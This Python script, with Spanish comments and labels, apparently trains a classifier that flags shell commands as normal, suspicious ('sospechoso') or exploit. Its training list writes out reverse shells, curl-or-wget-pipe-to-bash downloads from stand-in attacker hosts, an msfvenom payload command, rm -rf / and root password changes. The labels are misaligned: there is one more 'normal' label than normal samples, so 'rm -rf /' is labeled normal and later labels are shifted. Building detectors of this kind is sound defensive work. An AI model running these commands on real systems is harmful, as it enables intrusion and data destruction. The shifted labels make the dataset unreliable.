import os
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
import joblib

MODEL_DIR = os.path.join(os.path.dirname(__file__), 'models')
os.makedirs(MODEL_DIR, exist_ok=True)

# Dataset de ejemplo
X = [
    'get temp', 'get status', 'read sensor', 'ping google.com', 'check system status', 
    'status', 'get info', 'temp?', 'reboot system', 'get time', 'reset device', 
    'check battery level', 'restart device', 'get logs', 'check updates', 'read data',
    'device status', 'check temperature', 'check cpu usage', 'status update', 
    'get version', 'check memory usage', 'read device info', 'sensor reading', 
    'ping device', 'test sensor', 'set time', 'get system health', 'get network status',
    'rm -rf /', 'wget http://malware', 'nc -e /bin/sh', 'curl -X POST http://malicious-site.com', 
    'curl -X GET http://exploit.com', 'nc -lvp 4444', 'sudo passwd root', 
    'payload exec', 'meterpreter reverse', 'wget http://malicious.com/payload.sh',
    'curl --data "cmd=rm -rf /" http://evil.com', 'wget -O /tmp/malware.sh http://malicious-site.com', 
    'ftp -n 192.168.1.100', 'echo "mimikatz" | bash', 'nmap -sS 192.168.1.0/24', 
    'nmap -O 192.168.1.1', 'curl -L https://malicious-site.com -o payload.sh', 
    'scp malicious_file user@192.168.1.100:/tmp', 'chmod +x payload.sh && ./payload.sh',
    'ssh root@192.168.1.10', 'nc -e /bin/bash 192.168.1.100 4444',
    'telnet 192.168.1.100', 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1', 
    'sudo systemctl restart sshd', 'chmod 777 /tmp/malware', 'chmod +x malicious.sh', 
    'sudo chmod +s /usr/bin/bash', 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > /tmp/exploit.elf', 
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'wget http://exploit.com/malicious_script.sh -O /tmp/malware.sh', 
    'systemctl start sshd', 'curl -X GET http://evilsite.com/evil.sh | bash', 'mkdir /tmp/.ssh',
    'echo "root:password" | chpasswd', 'chmod +x /tmp/exploit.sh && /tmp/exploit.sh',
    'bash -i > /dev/tcp/192.168.0.1/4444 0<&1', 'nc -lvp 4444 -e /bin/bash', 
    'sudo apt-get install nmap', 'wget -qO- http://malicious-site.com/malware | bash', 
    'curl -L https://evil.com/malicious.sh | bash', 'exec /bin/bash -i > /dev/tcp/192.168.1.100/4444 0<&1',
    'perl -e \'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
    'wget -O /tmp/exploit.sh http://exploit.com && chmod +x /tmp/exploit.sh && /tmp/exploit.sh'
]

y = [
    'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 
    'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal',
    'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 'normal', 
    'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 
    'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 'sospechoso', 
    'sospechoso', 'sospechoso', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 
    'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 
    'exploit', 'exploit', 'exploit', 'exploit', 'exploit', 'exploit',
]

vectorizer = TfidfVectorizer(ngram_range=(1,2), max_features=2000)
model = LogisticRegression(max_iter=1000)
X_vec = vectorizer.fit_transform(X)
model.fit(X_vec, y)

joblib.dump({'model': model, 'vectorizer': vectorizer}, os.path.join(MODEL_DIR, 'modelo_persona2.joblib'))
print('Modelo guardado en models/modelo_persona2.joblib')
